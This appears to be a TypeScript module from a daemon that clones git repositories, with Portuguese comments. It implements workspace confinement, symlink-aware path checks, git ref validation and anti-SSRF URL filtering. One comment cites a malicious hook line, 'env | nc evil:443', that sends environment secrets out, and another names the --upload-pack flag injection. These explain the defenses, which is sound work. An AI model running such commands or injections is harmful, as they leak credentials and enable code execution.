import { spawn, spawnSync } from "node:child_process";
import { existsSync, statSync, accessSync, constants as fsConsts, mkdirSync, chownSync, rmSync, readdirSync, realpathSync } from "node:fs";
import path from "node:path";
import os from "node:os";
import type { RepoSummary as Repo } from "./types.js";
import { spawnDropped, type DropTarget } from "./privileges.js";

const FORBIDDEN_PATHS = new Set([os.homedir(), "/", "/etc", "/usr", "/bin", "/sbin", "/var", "/opt", "/dev"]);
const SKIP_SCAN_DIRS = new Set([
  ".git",
  ".hg",
  ".svn",
  "node_modules",
  "vendor",
  "dist",
  "build",
  ".next",
  ".nuxt",
  ".cache",
  ".turbo",
  ".venv",
  "__pycache__",
]);
const MAX_GIT_SCAN_DEPTH = 6;
const GIT_SCAN_CACHE_MS = 3000;
const gitScanCache = new Map<string, { ts: number; roots: string[] }>();

export function expandBasePath(input: string): string {
  if (input === "~") return os.homedir();
  if (input.startsWith("~/")) return path.join(os.homedir(), input.slice(2));
  return input;
}

/** True quando `candidate` resolvido está estritamente dentro de `root`
 *  resolvido (ou igual ao próprio root). Usa `path.sep` no comparador pra
 *  evitar bypass clássico "/home/u/proj" vs "/home/u/projevil" via
 *  startsWith literal. */
/** Resolve symlinks do prefixo existente mais profundo + reanexa a cauda que
 *  ainda não existe. Sem isto, `root/link` (link → /etc) passa no check lexical
 *  mas escapa o confinamento na hora de operar. */
function resolveReal(p: string): string {
  let cur = path.resolve(p);
  const tail: string[] = [];
  for (;;) {
    try {
      const real = realpathSync(cur);
      return tail.length ? path.join(real, ...tail.reverse()) : real;
    } catch {
      const parent = path.dirname(cur);
      if (parent === cur) return path.resolve(p); // nada do caminho existe
      tail.push(path.basename(cur));
      cur = parent;
    }
  }
}

export function isInsideRoot(candidate: string, root: string): boolean {
  // realpath em ambos pra bloquear escape via symlink (lexical não basta).
  const a = resolveReal(candidate);
  let b: string;
  try { b = realpathSync(path.resolve(root)); } catch { b = path.resolve(root); }
  if (a === b) return true;
  return a.startsWith(b + path.sep);
}

/** Workspace root permitido (THE_DUDES_WORKSPACE_ROOT). Quando definido, o
 *  daemon SÓ pode operar dentro dele — qualquer cwd/worktree fora é rejeitado.
 *  Reduz o blast radius: um server comprometido não consegue apontar o agente
 *  pra fora da pasta escolhida pelo dono da máquina. Retorna null se não
 *  configurado (modo legado, só FORBIDDEN_PATHS). */
export function getWorkspaceRoot(): string | null {
  const v = process.env.THE_DUDES_WORKSPACE_ROOT;
  if (v && v.trim()) return path.resolve(expandBasePath(v.trim()));
  // Fail-closed por padrão: sem a env, confina ao $HOME do usuário em vez de
  // permitir QUALQUER diretório. Aperte definindo THE_DUDES_WORKSPACE_ROOT
  // (pasta única) ou aponte pra um root fora do $HOME quando necessário.
  const home = (process.env.HOME || process.env.USERPROFILE || "").trim();
  if (home) return path.resolve(home);
  return null; // sem HOME (raro) — modo legado (só FORBIDDEN_PATHS + warn)
}

let warnedNoWorkspaceRoot = false;

/** Falha se `cwd` cair fora do workspace root configurado. No-op (com warn
 *  único) quando THE_DUDES_WORKSPACE_ROOT não está setado. */
export function assertWorkspaceScoped(cwd: string): void {
  const root = getWorkspaceRoot();
  if (!root) {
    if (!warnedNoWorkspaceRoot) {
      warnedNoWorkspaceRoot = true;
      console.warn(
        "[the-dudes] THE_DUDES_WORKSPACE_ROOT não definido — o daemon pode " +
        "operar em qualquer diretório não-proibido. Defina-o (ex: " +
        "~/.the-dudes/workspace) para limitar o daemon a uma única pasta.",
      );
    }
    return;
  }
  if (!isInsideRoot(cwd, root)) {
    throw new Error(
      `cwd "${path.resolve(cwd)}" fora do workspace root permitido "${root}" ` +
      `(THE_DUDES_WORKSPACE_ROOT)`,
    );
  }
}

/** Bloqueia git refs/branch names que possam ser interpretados como flag
 *  CLI pelo git (e.g. "--orphan", "-fxxx"). Aceita só [A-Za-z0-9._/-] e
 *  rejeita explicitamente leading "-" e ".." em segmento. Caracteres
 *  perigosos pra subshell (`$`, `;`, backticks, espaço) também caem fora. */
export function validateGitRef(name: string, kind = "ref"): void {
  if (!name || typeof name !== "string") throw new Error(`${kind} obrigatório`);
  if (name.length > 200) throw new Error(`${kind} muito longo`);
  if (name.startsWith("-")) throw new Error(`${kind} não pode começar com '-'`);
  if (!/^[A-Za-z0-9._/+-]+$/.test(name)) throw new Error(`${kind} contém caracteres inválidos`);
  // git ref naming rules: sem ".." consecutivo, sem terminar em ".lock", sem "//"
  if (name.includes("..") || name.endsWith(".lock") || name.includes("//")) {
    throw new Error(`${kind} viola regras de nome git`);
  }
}

/** Aceita só hashes git (commits, tags abreviadas, etc): 4-64 chars hex
 *  + opcional `^N`/`~N`/`:path`. Bloqueia leading "-" e qualquer flag-like
 *  injection em `git show <X>`. */
export function validateGitHash(hash: string): void {
  if (!hash || typeof hash !== "string") throw new Error("hash obrigatório");
  if (hash.startsWith("-")) throw new Error("hash não pode começar com '-'");
  if (hash.length > 200) throw new Error("hash muito longo");
  if (!/^[A-Za-z0-9._/^~:+-]+$/.test(hash)) throw new Error("hash com caracteres inválidos");
}

export function validateBasePath(input: string): string {
  if (!input || typeof input !== "string") throw new Error("base path required");
  const resolved = path.resolve(expandBasePath(input));
  if (!resolved.startsWith("/")) throw new Error(`base path "${resolved}" must be absolute`);
  if (FORBIDDEN_PATHS.has(resolved)) throw new Error(`base path "${resolved}" is not allowed`);
  return resolved;
}

export function ensureWritableDir(dir: string, drop: DropTarget | null = null): void {
  if (!existsSync(dir)) {
    mkdirSync(dir, { recursive: true });
    if (drop) {
      // make sure new dirs end up owned by the target user, not root
      try { chownSync(dir, drop.uid, drop.gid); } catch {}
    }
    return;
  }
  const st = statSync(dir);
  if (!st.isDirectory()) throw new Error(`"${dir}" is not a directory`);
  accessSync(dir, fsConsts.W_OK);
}

export function repoCwd(basePath: string, repoName: string): string {
  // Reject path-traversal in repoName so a malicious project admin cannot
  // make the daemon write outside the chosen workspace.
  const cleaned = path.basename(repoName);
  if (cleaned !== repoName || cleaned === "" || cleaned === "." || cleaned === "..") {
    throw new Error(`invalid repo name "${repoName}"`);
  }
  const resolved = path.resolve(basePath, cleaned);
  const baseAbs = path.resolve(basePath) + path.sep;
  if (!(resolved + path.sep).startsWith(baseAbs)) {
    throw new Error(`repo path "${resolved}" escapes base "${basePath}"`);
  }
  return resolved;
}

/** True se o IP literal cai em range privado/loopback/link-local/CGNAT
 *  (IPv4, IPv4-mapped e IPv6). Base do bloqueio anti-SSRF. */
function ipInPrivateRange(ipRaw: string): boolean {
  const s = ipRaw.toLowerCase().replace(/^\[|\]$/g, "");
  const mapped = s.match(/^::ffff:(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})$/);
  const v4 = mapped ? mapped[1] : (/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(s) ? s : null);
  if (v4) {
    const o = v4.split(".").map((x) => Number(x));
    if (o.some((n) => Number.isNaN(n) || n < 0 || n > 255)) return true; // malformado → bloqueia
    if (o[0] === 0 || o[0] === 127 || o[0] === 10) return true;
    if (o[0] === 169 && o[1] === 254) return true;            // link-local / metadata
    if (o[0] === 172 && o[1] >= 16 && o[1] <= 31) return true; // 172.16/12
    if (o[0] === 192 && o[1] === 168) return true;            // 192.168/16
    if (o[0] === 100 && o[1] >= 64 && o[1] <= 127) return true; // CGNAT 100.64/10
    return false;
  }
  if (s === "::1" || s === "::" || s === "0:0:0:0:0:0:0:1") return true;
  if (s.startsWith("fe80:")) return true; // link-local
  if (/^f[cd][0-9a-f]{2}:/.test(s) || /^f[cd]$/.test(s.slice(0, 2))) return true; // ULA fc00::/7
  return false;
}

/** Resolve o host (DNS) e bloqueia se QUALQUER IP resolvido for privado —
 *  cobre hostname→IP-privado e rebinding. Literal IP é checado direto.
 *  Fail-closed: não-resolve → bloqueia. */
async function hostIsPrivate(hostRaw: string): Promise<boolean> {
  const h = hostRaw.toLowerCase().replace(/^\[|\]$/g, "");
  if (!h) return true;
  if (h === "localhost" || h.endsWith(".localhost") || h.endsWith(".local") || h.endsWith(".internal")) return true;
  // IP literal (v4/v6)?
  if (/^\d{1,3}(\.\d{1,3}){3}$/.test(h) || h.includes(":")) return ipInPrivateRange(h);
  // hostname → resolve TODOS os endereços e checa cada um.
  try {
    const { lookup } = await import("node:dns/promises");
    const addrs = await lookup(h, { all: true });
    if (addrs.length === 0) return true;
    return addrs.some((a) => ipInPrivateRange(a.address));
  } catch {
    return true; // não resolve → fail-closed
  }
}

export async function isAllowedGitUrl(gitUrl: string): Promise<{ ok: true } | { ok: false; reason: string }> {
  if (!gitUrl || typeof gitUrl !== "string") return { ok: false, reason: "git url vazia" };
  // Allowed forms: https://…, http://…, ssh://…, git://…, git@host:path
  // scp-like: ANTES retornava ok sem checar host (bypass total do anti-SSRF — MED-4).
  const scp = /^[a-zA-Z0-9._-]+@([a-zA-Z0-9.-]+):.+$/.exec(gitUrl);
  if (scp) {
    if (await hostIsPrivate(scp[1])) return { ok: false, reason: `host privado bloqueado: ${scp[1]}` };
    return { ok: true };
  }
  let u: URL;
  try { u = new URL(gitUrl); } catch { return { ok: false, reason: "URL inválida" }; }
  const allowed = ["https:", "http:", "ssh:", "git:"];
  if (!allowed.includes(u.protocol)) return { ok: false, reason: `protocolo não permitido: ${u.protocol}` };
  // Bloqueia host privado/loopback/metadata — agora com DNS resolve + IPv6 (MED-3).
  if (await hostIsPrivate(u.hostname)) return { ok: false, reason: `host privado bloqueado: ${u.hostname}` };
  return { ok: true };
}

export function repoExistsAt(basePath: string, repoName: string): boolean {
  const dir = repoCwd(basePath, repoName);
  return existsSync(path.join(dir, ".git"));
}

function canonicalPath(input: string): string {
  const resolved = path.resolve(expandBasePath(input));
  try {
    return realpathSync(resolved);
  } catch {
    return resolved;
  }
}

export function findGitRoot(startPath: string): string | null {
  if (!existsSync(startPath)) return null;
  const res = spawnSync("git", ["rev-parse", "--show-toplevel"], {
    cwd: startPath,
    encoding: "utf8",
    stdio: ["ignore", "pipe", "ignore"],
  });
  if (res.status !== 0) return null;
  const root = res.stdout.trim();
  return root ? path.resolve(root) : null;
}

export function autoWorkspaceCwd(basePath: string): string {
  const resolved = canonicalPath(basePath);
  const roots = findGitRoots(resolved);
  return roots[0] ?? resolved;
}

export function findGitRoots(basePath: string, maxDepth = MAX_GIT_SCAN_DEPTH): string[] {
  const resolved = canonicalPath(basePath);
  const cacheKey = `${resolved}:${maxDepth}`;
  const cached = gitScanCache.get(cacheKey);
  if (cached && Date.now() - cached.ts < GIT_SCAN_CACHE_MS) return cached.roots;

  const root = findGitRoot(resolved);
  if (root) {
    const roots = [root];
    gitScanCache.set(cacheKey, { ts: Date.now(), roots });
    return roots;
  }
  if (!existsSync(resolved)) return [];

  const found = new Set<string>();
  const walk = (dir: string, depth: number) => {
    if (depth > maxDepth) return;
    let entries;
    try {
      entries = readdirSync(dir, { withFileTypes: true });
    } catch {
      return;
    }
    if (entries.some((e) => e.name === ".git")) {
      const repoRoot = findGitRoot(dir);
      if (repoRoot) found.add(repoRoot);
      return;
    }
    for (const e of entries) {
      if (!e.isDirectory()) continue;
      if (SKIP_SCAN_DIRS.has(e.name)) continue;
      if (e.name.startsWith(".") && e.name !== ".config") continue;
      walk(path.join(dir, e.name), depth + 1);
    }
  };
  walk(resolved, 0);
  const roots = [...found].sort((a, b) => {
    const depthA = path.relative(resolved, a).split(path.sep).filter(Boolean).length;
    const depthB = path.relative(resolved, b).split(path.sep).filter(Boolean).length;
    return depthA - depthB || a.localeCompare(b);
  });
  gitScanCache.set(cacheKey, { ts: Date.now(), roots });
  return roots;
}

export function describeGitRoots(basePath: string): string {
  const roots = findGitRoots(basePath);
  if (roots.length === 0) return "workspace sem git";
  const base = canonicalPath(basePath);
  const primary = roots[0];
  const rel = path.relative(base, primary) || ".";
  if (roots.length === 1) return `git repo detectado em ${primary}`;
  return `${roots.length} repos Git detectados; usando ${rel}`;
}

export interface CloneResult {
  repoName: string;
  ok: boolean;
  message: string;
}

export async function cloneRepoIfMissing(basePath: string, repo: Repo, drop: DropTarget | null = null): Promise<CloneResult> {
  const urlCheck = await isAllowedGitUrl(repo.gitUrl);
  if (!urlCheck.ok) {
    return { repoName: repo.name, ok: false, message: `git url rejeitada: ${urlCheck.reason}` };
  }
  if (repo.defaultBranch) {
    try { validateGitRef(repo.defaultBranch, "branch"); }
    catch (e) { return { repoName: repo.name, ok: false, message: (e as Error).message }; }
  }
  let target: string;
  try {
    target = repoCwd(basePath, repo.name);
  } catch (e) {
    return { repoName: repo.name, ok: false, message: (e as Error).message };
  }
  if (existsSync(path.join(target, ".git"))) {
    return { repoName: repo.name, ok: true, message: "already cloned" };
  }
  if (existsSync(target)) {
    rmSync(target, { recursive: true, force: true });
  }
  return await runGitClone(repo.gitUrl, target, repo.defaultBranch, drop);
}

function runGitClone(gitUrl: string, target: string, branch: string | undefined, drop: DropTarget | null): Promise<CloneResult> {
  return new Promise((resolve) => {
    const args = ["clone"];
    if (branch) {
      // Re-valida defensivamente — branch chega como --branch <X> antes do
      // separador `--`, então um leading `-` é tratado como flag pelo git
      // (e.g. --upload-pack=<cmd> = RCE local via clone).
      try { validateGitRef(branch, "branch"); }
      catch (e) {
        resolve({ repoName: path.basename(target), ok: false, message: (e as Error).message });
        return;
      }
      args.push("--branch", branch);
    }
    args.push("--", gitUrl, target);
    // Env enxuto: NÃO espalha process.env. Repo malicioso pode ter
    // .git/hooks/post-checkout que ecoa env (`env | nc evil:443`).
    // Sem essa proteção, THE_DUDES_DAEMON_TOKEN + outras secrets do
    // daemon process vazam pro hook. Só passa o mínimo essencial.
    const minimalEnv: NodeJS.ProcessEnv = {
      PATH: process.env.PATH ?? "/usr/local/bin:/usr/bin:/bin",
      HOME: drop?.home ?? process.env.HOME ?? "/tmp",
      USER: drop?.user ?? process.env.USER ?? "nobody",
      LANG: process.env.LANG ?? "C.UTF-8",
      // git-specific hardening
      GIT_TERMINAL_PROMPT: "0",
      GIT_CONFIG_NOSYSTEM: "1",
      GIT_CONFIG_GLOBAL: "/dev/null", // ignora ~/.gitconfig do daemon
    };
    if (process.env.SSH_AUTH_SOCK) minimalEnv.SSH_AUTH_SOCK = process.env.SSH_AUTH_SOCK;
    const proc = spawnDropped("git", args, {
      stdio: ["ignore", "pipe", "pipe"],
      env: minimalEnv,
    }, drop);
    let stderr = "";
    proc.stderr!.setEncoding("utf8");
    proc.stderr!.on("data", (c: string) => { stderr += c; });
    proc.on("close", (code) => {
      const repoName = path.basename(target);
      if (code === 0) resolve({ repoName, ok: true, message: "cloned" });
      else resolve({ repoName, ok: false, message: stderr.trim().slice(0, 500) || `git clone exited ${code}` });
    });
    proc.on("error", (e) => {
      resolve({ repoName: path.basename(target), ok: false, message: (e as Error).message });
    });
  });
}

export async function cloneAllRepos(basePath: string, repos: Repo[], drop: DropTarget | null = null): Promise<CloneResult[]> {
  const results: CloneResult[] = [];
  for (const r of repos) {
    results.push(await cloneRepoIfMissing(basePath, r, drop));
  }
  return results;
}
